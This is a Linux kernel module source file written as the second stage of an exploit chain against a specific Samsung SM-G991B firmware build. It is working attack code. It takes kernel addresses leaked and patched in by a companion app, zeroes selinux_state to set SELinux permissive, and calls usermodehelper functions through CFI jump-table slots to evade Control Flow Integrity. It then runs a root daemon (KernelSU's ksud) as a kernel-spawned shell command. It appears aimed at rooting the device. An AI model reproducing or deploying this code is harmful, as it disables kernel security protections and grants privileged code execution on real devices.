/* df_addr: address-driven second stage for SM-G991B/HZC2 (5.4.242).
 *
 * No in-module resolution at all (no scan, no kprobe, no text decode):
 * the APP computes slid addresses (perf slide leak + file offsets) and
 * patches the placeholders below into the .ko image BEFORE the CBC write.
 * The module just uses them. Imports: printk only (+memset if emitted).
 *
 * Placeholders (u64, 8-byte magic prefixes, patched by the app):
 *   ADDR_SELINUX_STATE : slid selinux_state (data write, CFI-free)
 *   ADDR_UMH_SETUP_JT  : slid call_usermodehelper_setup.cfi_jt
 *   ADDR_UMH_EXEC_JT   : slid call_usermodehelper_exec.cfi_jt
 * Calls through .cfi_jt slots with header-exact prototypes are CFI-clean.
 * UMH failure modes observed via dfm0/dfm1 (written by the sh command).
 * Always resident (HZC2 unload hangs).
 */
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("address-driven second stage (HZC2)");

static char *soft_reboot;
module_param(soft_reboot, charp, 0400);

/* exact prototypes from include/linux/umh.h (CFI type match matters) */
struct subprocess_info;
typedef struct subprocess_info *(*umh_setup_fn_t)(const char *path,
						  char **argv, char **envp,
						  unsigned int gfp_mask,
						  int (*init)(struct subprocess_info *info,
							      struct cred *new),
						  void (*cleanup)(struct subprocess_info *info),
						  void *data);
typedef int (*umh_exec_fn_t)(struct subprocess_info *info, int wait);

/* magic placeholders: app overwrites with slid runtime addresses */
static unsigned long ADDR_SELINUX_STATE = 0xAAAAAAAAAAAAAAAAUL;
static unsigned long ADDR_UMH_SETUP_JT = 0xBBBBBBBBBBBBBBBBUL;
static unsigned long ADDR_UMH_EXEC_JT = 0xCCCCCCCCCCCCCCCCUL;

static int umh_init(struct subprocess_info *info, struct cred *new)
{
	(void)info;
	(void)new;
	return 0;
}

static int __init dfa_init(void)
{
	static char cmd0[] = "/data/user_de/0/df.root/ksud late-load"
		" --package-name me.weishu.kernelsu --ro-partitions"
		" && touch /dev/dfm0 || touch /dev/dfm1";
	static char cmd1[] = "/data/user_de/0/df.root/ksud late-load"
		" --package-name me.weishu.kernelsu --ro-partitions --soft-reboot"
		" && touch /dev/dfm0 || touch /dev/dfm1";
	static char *argv0[] = {
		(char *)"/system/bin/sh", (char *)"-c", cmd0, NULL
	};
	static char *argv1[] = {
		(char *)"/system/bin/sh", (char *)"-c", cmd1, NULL
	};
	static char *envp[] = {
		(char *)"HOME=/",
		(char *)"PATH=/sbin:/vendor/bin:/system/bin",
		NULL
	};
	umh_setup_fn_t umh_setup;
	umh_exec_fn_t umh_exec;
	struct subprocess_info *sub;
	int rc;

	if (ADDR_SELINUX_STATE == 0xAAAAAAAAAAAAAAAAUL ||
	    ADDR_UMH_SETUP_JT == 0xBBBBBBBBBBBBBBBBUL ||
	    ADDR_UMH_EXEC_JT == 0xCCCCCCCCCCCCCCCCUL) {
		pr_info("dfa: addresses unpatched, aborting cleanly\n");
		return 0;
	}
	*(volatile unsigned char *)ADDR_SELINUX_STATE = 0;
	__asm__ volatile("dsb sy" ::: "memory");
	pr_info("dfa: permissive set\n");
	umh_setup = (umh_setup_fn_t)ADDR_UMH_SETUP_JT;
	umh_exec = (umh_exec_fn_t)ADDR_UMH_EXEC_JT;
	sub = umh_setup("/system/bin/sh", soft_reboot ? argv1 : argv0, envp,
			0xcc0u /* GFP_KERNEL */, umh_init, 0, 0);
	if (!sub)
		return 0;
	rc = umh_exec(sub, 2 /* UMH_WAIT_PROC */);
	pr_info("dfa: umh_exec rc=%d\n", rc);
	return 0;
}

module_init(dfa_init);
